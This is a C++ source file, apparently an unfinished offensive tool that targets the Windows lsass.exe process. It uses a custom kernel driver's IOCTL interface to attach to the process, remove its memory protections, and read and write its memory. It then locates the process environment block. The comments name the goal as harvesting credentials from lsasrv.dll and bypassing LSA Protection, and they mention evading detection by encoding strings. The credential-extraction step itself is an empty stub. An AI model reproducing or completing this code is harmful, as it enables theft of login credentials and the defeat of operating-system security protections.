#include <iostream>
#include <windows.h>
#include <winternl.h>



//To DO: Edit reg keys and remove LSA Protection or just modify mem here..?

//Target Process
const wchar_t* wProc = L"lsass.exe";



//Function definition for NtQueryInformationProcess
typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);


//Needed for locating TEB/PEB -> Loaded structs -> creds in lsasrv.dll
typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
	HANDLE ProcessHandle,              // Handle to the process
	PROCESSINFOCLASS ProcessInformationClass,  // Type of information to retrieve
	PVOID ProcessInformation,          // Pointer to buffer to receive info
	ULONG ProcessInformationLength,    // Size of buffer
	PULONG ReturnLength                // Optional: bytes returned
	);


//We need the IOCTL and Request struct.
namespace driver {
	namespace codes {
		//IOCTL codes - drivers to communicate w/ usermode apps and vice versa. 
		//UserMode applications call DeviceIoControl to send a struct -> drivers.
		//Then we recieve the struct and do whatever we want with it.


		//Must be buffered IO so we can send buffers between kernel and userland.

		constexpr ULONG attach = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x696, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //setup the driver
	
		constexpr ULONG read = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x697, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //read process mem

		constexpr ULONG write = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //write process mem.

		constexpr ULONG getProtection = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x699, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //retreieve protections on process  process mem.

		constexpr ULONG unprotect = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //unprotect process mem.

		constexpr ULONG protect = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //protect process mem.


	}

	struct Request {
		HANDLE hPID; //
		PVOID pTargetMemory; //victim process
		PVOID pBuffer;
		SIZE_T sSize;
		SIZE_T sReturn_size;
	};

	bool attachToProcess(const DWORD PID, HANDLE hDriver) {
		Request req;
		req.hPID = (HANDLE)(PID); //because the function in kernel land wants a handle of the PID...
		return DeviceIoControl(hDriver, codes::attach, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
	}
	template <class T>
	T readMemory(HANDLE hDriver, const std::uintptr_t addr) {
		T temp = {};
		Request req;
		req.pTargetMemory = reinterpret_cast<PVOID>(addr);
		req.pBuffer = &temp; //result of MmCopyVritualMemory call goes in here hence the template cos the typing may be weird.
		req.sSize = sizeof(T);
		DeviceIoControl(hDriver, codes::read, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
		return temp; //return this back to the driver.
	}
	template <class T>
	void writeMemory(HANDLE hDriver, const std::uintptr_t addr, const T& value) {
		Request req;
		req.pTargetMemory = reinterpret_cast<PVOID>(addr);
		req.pBuffer = (PVOID)&value;
		req.sSize = sizeof(T);
		DeviceIoControl(hDriver, codes::write, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
	}

	bool unprotect(HANDLE hDriver) {
		Request req;
		return DeviceIoControl(hDriver, codes::unprotect, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
	}

}



bool Extract() {

	return true;
}


bool GetRemoteProcessHandle(HANDLE* hTarget, DWORD* PID) {

	HMODULE hNtdll = GetModuleHandleA("ntdll.dll"); //i know these strings r baddddd
	fnNtQuerySystemInformation pNtQuerySystemInformation = NULL;


	if (!hNtdll) {
		printf("Failure finding module...");
		return false;
	}
	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation"); //i should probabyl do some kind fo encoding for this..

	if (!pNtQuerySystemInformation) {
		printf("Failure finding fucntions...");
		return false;
	}

	ULONG ReturnLength1 = 0x00; //needed buffer size for systemprocessinformation buffer
	ULONG ReturnLengthSystemInfo = 0x00; //actual returned buffer size for systemprocess information
	//first call tells us how big it needs to be..
	pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &ReturnLength1); //Now we're getting system proc info..

	//Second call populates..
	PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)ReturnLength1);

	NTSTATUS status = pNtQuerySystemInformation(SystemProcessInformation, pSystemProcessInformation, ReturnLength1, &ReturnLengthSystemInfo); //Now we're getting system proc info..

	if (!pSystemProcessInformation && status != 0x00) {
		printf("SystemProcessInformation is empty...");
		return 0;
	}
	

	while (true) {
		if (pSystemProcessInformation->ImageName.Length && wcscmp(pSystemProcessInformation->ImageName.Buffer, wProc) == 0) { //make sure the process ahs a name 
			// openning a handle to the target process and saving it, then breaking 
			wprintf(L"[i] Process \"%s\" - Of Pid : %d \n", pSystemProcessInformation->ImageName.Buffer, pSystemProcessInformation->UniqueProcessId);
			*hTarget = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pSystemProcessInformation->UniqueProcessId);
			*PID = (DWORD)pSystemProcessInformation->UniqueProcessId;			
			break;
		}

		if (!pSystemProcessInformation->NextEntryOffset) {
			printf("Broken?");
			break;
		}
		// moving to the next element in the array
		pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pSystemProcessInformation + pSystemProcessInformation->NextEntryOffset);
	}


	//shift to PEB stuff...
	//https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess?redirectedfrom=MSDN



	return true;
}



bool locatePEB(HANDLE hTarget,PPEB* pPEB) {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return false;

	printf("NTDLL Handle\n");
	fnNtQueryInformationProcess pNtQueryInformationProcess =(fnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	if (!pNtQueryInformationProcess) return false;

	PROCESS_BASIC_INFORMATION pProcBasicInfo = { 0 };  
	ULONG ulRetLength = 0;

	NTSTATUS status = pNtQueryInformationProcess(hTarget,ProcessBasicInformation, &pProcBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &ulRetLength);

	if (!NT_SUCCESS(status)) {
		return false;
	}
	printf("pointing pPEB\n");

	*pPEB = pProcBasicInfo.PebBaseAddress;  // struct access, not pointer
	printf("pPEB pointed???????\n");

}

int main(int argc, wchar_t* argv[]) {
	//Driver stuf...

	const HANDLE hDriver = CreateFile(L"\\\\.\\noah", GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("ERROR W DRIVER HANDLE");
		return 1;
	}

	DWORD TargetPID;
	HANDLE hTarget;

	if (!GetRemoteProcessHandle(&hTarget, &TargetPID)) {
		printf("Failed to get process handle!\n");
		return 0;
	}

	//Driver is attaching to target process via PID.
	if (driver::attachToProcess(TargetPID, hDriver) == true) {
		printf("Attached!\n");
	}


	//Driver is now attached and we need to parse through process memory.

	if (driver::unprotect(hDriver) == true) {
		printf("Removed protections from target process...\n");
	}
	
	//Now that process protections are disabled we can ready process memory from userland.

	//Step 1. Locate PEB
	PPEB pRemotePEB = (PPEB)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB));
	PPEB pLocalPEB = (PPEB)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB));
	if (!pRemotePEB) {
		printf("HeapAlloc failed\n");
		return 1;
	}
	if (!locatePEB(hTarget, &pRemotePEB)) {
		printf("locatePEB failed\n");
		return 1;
	}
	printf("PEB Pointer found\n");

	SIZE_T sBytesTransferred = 0;
	if (!ReadProcessMemory(hTarget, pRemotePEB, pLocalPEB, sizeof(PEB), &sBytesTransferred)) {
		printf("ReadProcessMemory failed: %lu\n", GetLastError());
		HeapFree(GetProcessHeap(), 0, pLocalPEB);
		return 1;
	}
	printf("Bytes: %d\n", sBytesTransferred);
	


	std::cout << "Hello world\n";

	return 0;
}